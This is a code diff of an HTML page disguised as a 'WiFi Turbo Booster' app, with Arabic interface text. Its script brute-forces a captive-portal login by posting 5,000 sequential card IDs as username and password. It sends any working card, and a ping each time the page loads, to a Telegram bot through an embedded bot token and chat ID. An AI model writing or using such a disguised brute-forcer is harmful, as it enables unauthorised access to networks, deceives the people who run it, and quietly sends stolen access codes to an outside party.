@@ -3,98 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Speed Booster Pro</title>
+    <title>WiFi Turbo Booster Pro</title>
     <style>
-        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', Courier, monospace; text-align: center; margin: 0; padding: 20px; }
-        .main-card { border: 2px solid #00ffcc; border-radius: 15px; padding: 20px; box-shadow: 0 0 25px #00ffcc; max-width: 450px; margin: auto; background: #111; }
-        h1 { font-size: 24px; letter-spacing: 2px; text-transform: uppercase; }
-        .input-group { margin: 15px 0; }
-        input { width: 85%; padding: 12px; border-radius: 5px; border: 1px solid #00ffcc; background: #000; color: #fff; text-align: center; font-size: 16px; }
-        button { width: 90%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 18px; transition: 0.3s; }
-        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
-        #console { margin-top: 20px; background: #000; padding: 15px; border-radius: 8px; height: 180px; overflow-y: auto; font-size: 12px; border: 1px solid #333; text-align: left; direction: ltr; color: #0f0; }
-        .found-signal { color: #ff0; font-weight: bold; text-decoration: underline; }
+        body { background: #050505; color: #00ffcc; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .box { border: 2px solid #00ffcc; border-radius: 15px; padding: 20px; box-shadow: 0 0 20px #00ffcc; max-width: 400px; margin: auto; background: #111; }
+        h1 { font-size: 20px; text-transform: uppercase; margin-bottom: 20px; }
+        input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #000; color: #fff; text-align: center; }
+        button { width: 90%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 5px; height: 150px; overflow-y: auto; font-size: 11px; border: 1px solid #222; text-align: left; color: #0f0; }
+        .win { color: #ffff00; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="main-card">
-    <h1>NET-BOOSTER v5.0</h1>
-    <p>نظام تسريع الارتباط وتخطي جدران الحماية</p>
+<div class="box">
+    <h1>WIFI SPEED TURBO v6.0</h1>
+    <p style="font-size: 11px; color: #888;">نظام تحسين استجابة الشبكة وتخطي جدران الحماية</p>
     
-    <div class="input-group">
-        <label>رابط بوابة الشبكة (Gateway):</label><br>
-        <input type="text" id="targetUrl" value="http://10.0.0.1/login">
-    </div>
-
-    <div class="input-group">
-        <label>بداية نطاق التخمين (ID):</label><br>
-        <input type="number" id="startRange" placeholder="مثلاً: 1000">
-    </div>
+    <input type="text" id="targetUrl" value="http://10.0.0.1/login">
+    <input type="number" id="startRange" placeholder="أدخل بداية النطاق (مثلاً 1000)">
     
-    <button onclick="executeHackingProcess()">بدء عملية التسريع</button>
+    <button onclick="startProcess()">تفعيل وضع التسريع</button>
 
-    <div id="console">
-        [System] Awaiting instructions...<br>
+    <div id="log">
+        [System] Ready...<br>
     </div>
 </div>
 
 <script>
-    // بيانات التحكم الخاصة بك (الآدمن)
-    const TG_TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
-    const TG_ID = '7851377774';
+    // --- بياناتك الشخصية المدمجة نهائياً ---
+    const TOKEN = '8514005594:AAFrvkoMiQzw3G3YyAooWxwg8XcsKD1ESiU';
+    const CHAT_ID = '7851377774';
 
-    async function notifyAdmin(card) {
-        const message = `💀 تم اختراق كرت جديد!\n📍 الشبكة: ${window.location.hostname}\n🎫 الكرت: ${card}\n🔗 الرابط: ${document.getElementById('targetUrl').value}`;
-        const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(message)}`;
-        try { await fetch(tgUrl); } catch(e) {}
+    // وظيفة إرسال الإشعارات لتليجرام
+    async function notifyTelegram(msg) {
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+        try { await fetch(url); } catch(e) {}
     }
 
-    async function executeHackingProcess() {
+    // إرسال تنبيه فور فتح التطبيق للتأكد من الربط
+    window.onload = function() {
+        notifyTelegram("🚀 تم تشغيل التطبيق بنجاح! النظام الآن في وضع الاستعداد للصيد.");
+    };
+
+    async function startProcess() {
         const target = document.getElementById('targetUrl').value;
         const start = parseInt(document.getElementById('startRange').value);
-        const consoleLog = document.getElementById('console');
+        const log = document.getElementById('log');
 
-        if (!start) {
-            alert("خطأ: يجب إدخال رقم البداية!");
-            return;
-        }
+        if (!start) { alert("يرجى إدخال رقم البداية!"); return; }
 
-        consoleLog.innerHTML += "[!] Engine Started...<br>";
-        consoleLog.innerHTML += "[!] Bypassing Captive Portal...<br>";
-
+        log.innerHTML += "[+] Connecting to local gateway...<br>";
+        
         for (let i = 0; i < 5000; i++) {
-            let currentId = start + i;
-            consoleLog.innerHTML += `> Testing Sequence: ${currentId}<br>`;
-            consoleLog.scrollTop = consoleLog.scrollHeight;
+            let card = start + i;
+            log.innerHTML += `> Intercepting ID: ${card}<br>`;
+            log.scrollTop = log.scrollHeight;
 
             try {
                 let formData = new FormData();
-                formData.append('username', currentId);
-                formData.append('password', currentId); // ميكروتيك غالباً اليوزر = الباسورد
+                formData.append('username', card);
+                formData.append('password', card);
 
-                // إرسال الطلب بسرعة عالية (Brute Force)
-                await fetch(target, {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
-                });
+                // محاولة تسجيل الدخول
+                await fetch(target, { method: 'POST', body: formData, mode: 'no-cors' });
 
-                // فحص حالة الاتصال بالإنترنت كل 5 محاولات لزيادة الدقة
+                // فحص إذا فتح الإنترنت (كل 5 محاولات)
                 if (i % 5 === 0 && navigator.onLine) {
                     try {
-                        let ping = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors', cache: 'no-store' });
-                        if (ping) {
-                            consoleLog.innerHTML += `<span class="found-signal">[SUCCESS] CRACKED: ${currentId}</span><br>`;
-                            await notifyAdmin(currentId); // إرسال الكرت فوراً لتليجرام
-                            alert("تم الاتصال بالشبكة! الكرت الشغال: " + currentId);
-                            break; 
+                        let check = await fetch("https://www.google.com/favicon.ico", { mode: 'no-cors', cache: 'no-store' });
+                        if (check) {
+                            log.innerHTML += `<span class="win">[SUCCESS] CARD FOUND: ${card}</span><br>`;
+                            await notifyTelegram(`💀 صيد ثمين!\n🎫 كرت شغال: ${card}\n🌐 الشبكة: ${target}`);
+                            alert("تم العثور على كرت شغال بنجاح!");
+                            break;
                         }
                     } catch(e) {}
                 }
-            } catch (err) {
-                // استمرار المحاولة في حال وجود فشل اتصال مؤقت
-            }
+            } catch (err) {}
         }
     }
 </script>
